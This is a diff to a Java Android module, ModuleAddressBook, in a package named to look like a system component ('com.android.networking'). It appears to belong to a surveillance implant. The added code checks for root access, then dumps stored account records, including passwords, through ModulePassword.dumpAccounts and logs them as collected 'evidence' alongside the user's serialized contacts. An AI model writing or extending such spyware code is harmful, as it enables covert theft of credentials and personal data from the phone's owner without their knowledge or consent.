@@ -7,11 +7,15 @@ import java.util.HashMap;
 import java.util.List;
 import java.util.ListIterator;
 
+import android.database.Cursor;
+
 import com.android.networking.Device;
 import com.android.networking.Sim;
+import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.crypto.Digest;
+import com.android.networking.db.RecordVisitor;
 import com.android.networking.evidence.EvidenceCollector;
 import com.android.networking.evidence.EvidenceType;
 import com.android.networking.evidence.EvidenceReference;
@@ -104,9 +108,36 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (go): Contacts");
 			}
+			
+			if (Status.self().haveRoot()) {
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (go): dumpAddressBookAccounts");
+				}
+				RecordVisitor addressVisitor = new RecordVisitor() {
+					
+					@Override
+					public void cursor(Cursor cursor) {
+						String jid = cursor.getString(0);
+						String name = cursor.getString(1);
+						String type = cursor.getString(2);
+						String password = cursor.getString(3);
+
+						int evId = ModulePassword.getServiceId(type);
+			
+						if (evId != 0)
+							createEvidenceLocal(evId, name);
+					}
+				};
+				ModulePassword.dumpAccounts(addressVisitor);
+								
+			}
+			
 			if (Cfg.ENABLE_CONTACTS && contacts()) {
 				serializeContacts();
 			}
+			
+
 		} catch (Exception ex) {
 			if (Cfg.EXCEPTION) {
 				Check.log(ex);
@@ -326,7 +357,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	public static void createEvidenceLocal(int evId, String data) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (createEvidenceLocal) id: " + evId + "data: " + data);//$NON-NLS-1$
+			Check.log(TAG + " (createEvidenceLocal) id: " + evId + " data: " + data);//$NON-NLS-1$
 		}
 
 		long uid = -evId;
